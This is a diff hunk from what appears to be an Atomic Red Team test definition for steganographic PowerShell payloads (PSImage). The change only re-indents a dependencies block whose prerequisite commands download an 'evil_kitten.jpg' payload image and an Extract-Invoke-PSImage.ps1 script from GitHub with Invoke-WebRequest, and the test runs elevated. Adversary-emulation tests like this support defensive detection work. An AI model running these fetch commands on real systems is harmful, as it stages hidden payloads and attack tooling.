@@ -101,28 +101,28 @@ atomic_tests:
         default: PathToAtomicsFolder\ExternalPayloads\Extract-Invoke-PSImage.ps1
     dependency_executor_name: powershell
     dependencies:
-      - description: |
-          Image file must exist
-        prereq_command: |
-          if (!(Test-Path "#{image_file}")) {exit 1} else {
-          {exit 0}
-          }
-        get_prereq_command: |
-          New-Item -Type Directory (split-path "#{image_file}") -ErrorAction Ignore | Out-Null
-          Write-Output "Downloading image file..."
-          $imageUrl = "https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg"
-          Invoke-WebRequest -Uri $imageUrl -OutFile #{image_file}
-      - description: |
-          Extract-Invoke-PSImage must exist
-        prereq_command: |
-          if (!(Test-Path "#{psimage_script}")) {exit 1} else {
-          {exit 0}
-          }
-        get_prereq_command: |
-          New-Item -Path "PathToAtomicsFolder\ExternalPayloads\" -ItemType Directory -Force | Out-Null
-          Write-Output "Downloading Extract-Invoke-PSImage.ps1 script..."
-          $scriptUrl = "https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1"
-          Invoke-WebRequest -Uri $scriptUrl -OutFile #{psimage_script}
+    - description: |
+        Image file must exist
+      prereq_command: |
+        if (!(Test-Path "#{image_file}")) {exit 1} else {
+        {exit 0}
+        }
+      get_prereq_command: |
+        New-Item -Type Directory (split-path "#{image_file}") -ErrorAction Ignore | Out-Null
+        Write-Output "Downloading image file..."
+        $imageUrl = "https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg"
+        Invoke-WebRequest -Uri $imageUrl -OutFile #{image_file}
+    - description: |
+        Extract-Invoke-PSImage must exist
+      prereq_command: |
+        if (!(Test-Path "#{psimage_script}")) {exit 1} else {
+        {exit 0}
+        }
+      get_prereq_command: |
+        New-Item -Path "PathToAtomicsFolder\ExternalPayloads\" -ItemType Directory -Force | Out-Null
+        Write-Output "Downloading Extract-Invoke-PSImage.ps1 script..."
+        $scriptUrl = "https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1"
+        Invoke-WebRequest -Uri $scriptUrl -OutFile #{psimage_script}
     executor:
       name: powershell
       elevation_required: true
